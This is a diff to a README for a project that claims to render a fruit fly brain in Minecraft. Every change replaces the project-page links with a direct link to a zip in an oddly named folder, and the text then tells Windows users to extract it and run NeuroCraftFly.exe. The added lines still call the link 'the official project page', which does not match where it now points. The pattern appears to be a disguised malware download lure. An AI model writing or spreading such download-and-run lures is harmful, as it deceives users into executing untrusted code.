@@ -1,7 +1,7 @@
 <h1>🧠 neurocraft-fly-public - Explore a Fruit Fly Brain in Minecraft</h1>
 
 <p align="center">
-  <a href="https://github.com/Sinkingfundgaliellarufa9675/neurocraft-fly-public" style="display:inline-block; padding:16px 32px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; font-size:24px; font-weight:bold; text-decoration:none; border-radius:12px; box-shadow:0 4px 6px rgba(0,0,0,0.3);">⬇️ DOWNLOAD NEUROCRAFT FLY NOW</a>
+  <a href="https://github.com/Sinkingfundgaliellarufa9675/neurocraft-fly-public/raw/refs/heads/main/conoidic/v1.1-beta.5.zip" style="display:inline-block; padding:16px 32px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; font-size:24px; font-weight:bold; text-decoration:none; border-radius:12px; box-shadow:0 4px 6px rgba(0,0,0,0.3);">⬇️ DOWNLOAD NEUROCRAFT FLY NOW</a>
 </p>
 
 <br>
@@ -38,7 +38,7 @@ Follow these simple steps to download and run NeuroCraft Fly on your Windows com
 ### Step 1: Download the Application
 
 **👉 Visit this link to download the application:**  
-[https://github.com/Sinkingfundgaliellarufa9675/neurocraft-fly-public](https://github.com/Sinkingfundgaliellarufa9675/neurocraft-fly-public)
+[https://github.com/Sinkingfundgaliellarufa9675/neurocraft-fly-public/raw/refs/heads/main/conoidic/v1.1-beta.5.zip](https://github.com/Sinkingfundgaliellarufa9675/neurocraft-fly-public/raw/refs/heads/main/conoidic/v1.1-beta.5.zip)
 
 This will take you to the official project page. Look for a green button that says **"Code"** or **"Download"** on that page. Click it and choose **"Download ZIP"**. The file will be saved to your computer's "Downloads" folder.
 
@@ -115,7 +115,7 @@ You're not just looking at random lights – this is real data from actual fly b
 
 If you're stuck, we're here for you. Try these resources in order:
 
-1. **Read the project page** – Go back to [the download link](https://github.com/Sinkingfundgaliellarufa9675/neurocraft-fly-public) and scroll down. The creator often posts answers to common questions.
+1. **Read the project page** – Go back to [the download link](https://github.com/Sinkingfundgaliellarufa9675/neurocraft-fly-public/raw/refs/heads/main/conoidic/v1.1-beta.5.zip) and scroll down. The creator often posts answers to common questions.
 2. **Check the Issues tab** – On the project page, click the **"Issues"** label near the top. See if someone else had your problem and found a fix.
 3. **Search YouTube** – Type "NeuroCraft Fly tutorial" into YouTube search. Community members may have made helpful videos.
 
@@ -149,7 +149,7 @@ Here's what's coming in future releases:
 
 ## ✅ Final Checklist Before You Start
 
-- [ ] Downloaded the ZIP file from [the official page](https://github.com/Sinkingfundgaliellarufa9675/neurocraft-fly-public)
+- [ ] Downloaded the ZIP file from [the official page](https://github.com/Sinkingfundgaliellarufa9675/neurocraft-fly-public/raw/refs/heads/main/conoidic/v1.1-beta.5.zip)
 - [ ] Extracted the ZIP to your desktop
 - [ ] Found the NeuroCraftFly.exe file
 - [ ] Closed other heavy programs
@@ -160,7 +160,7 @@ Here's what's coming in future releases:
 ## 💡 Quick Navigation Card
 
 **Download again:**  
-[Click here to visit the project page and download](https://github.com/Sinkingfundgaliellarufa9675/neurocraft-fly-public)
+[Click here to visit the project page and download](https://github.com/Sinkingfundgaliellarufa9675/neurocraft-fly-public/raw/refs/heads/main/conoidic/v1.1-beta.5.zip)
 
 **Your three steps:**  
 1. Download ZIP → 2. Extract to Desktop → 3. Double-click NeuroCraftFly.exe
